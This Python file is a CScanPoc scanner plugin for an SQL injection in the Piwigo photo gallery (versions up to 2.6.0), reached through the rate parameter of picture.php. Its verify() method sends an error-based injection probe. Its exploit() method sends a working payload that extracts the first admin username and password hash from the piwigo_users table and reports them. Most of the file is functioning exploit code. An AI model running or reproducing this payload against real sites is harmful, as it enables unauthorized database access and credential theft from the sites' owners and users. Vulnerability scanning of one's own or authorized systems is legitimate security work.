# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'Piwigo_0000'  # 平台漏洞编号，留空
    name = 'Piwigo <= v2.6.0 /piwigo/include/functions_rate.inc.php SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-11-15'  # 漏洞公布时间
    desc = '''
        Piwigo是一个基于MySQL5与PHP5开发的相册系统.提供基本的发布和管理照片功能,按多种方式浏览如类别,标签,时间等。
        Piwigo <= v2.6.0 /piwigo/include/functions_rate.inc.php文件存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://www.freebuf.com/vuls/51401.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Piwigo'  # 漏洞应用名称
    product_version = '<=2.6.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b42e84f3-e978-493f-8934-2c1b0424bb54'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("rate=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(md5(437895),FLOOR"
                       "(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)")
            verify_url = '{target}'.format(
                target=self.target)+"/piwigo/picture.php?/1/category/1&action=rate"
            request = urllib.request.Request(verify_url, payload)
            response = urllib.request.urlopen(request)
            content = str(response.read())
            if '8e2873ed66791d114792734402de17f7' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            vul_url = '{target}'.format(
                target=self.target) + "/piwigo/picture.php?/1/category/1&action=rate"
            payload = ("rate=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT username FROM piwigo_users LIMIT 1)"
                       ",0x3a,(SELECT substr(password,1,34) FROM piwigo_users WHERE username="
                       "(SELECT username FROM piwigo_users LIMIT 1)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA."
                       "CHARACTER_SETS GROUP BY x)a)")
            request = urllib.request.Request(vul_url, payload)
            response = urllib.request.urlopen(request)
            content = str(response.read())
            pattern = re.compile(
                r'.*?Duplicate entry \'(?P<username>[^<>]*?):(?P<password>[^<>]*?)1\' for key \'group_key\'', re.I | re.S)
            match = pattern.match(content)
            if match != None:
                username = match.group("username").strip()
                password = match.group("password").strip()
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
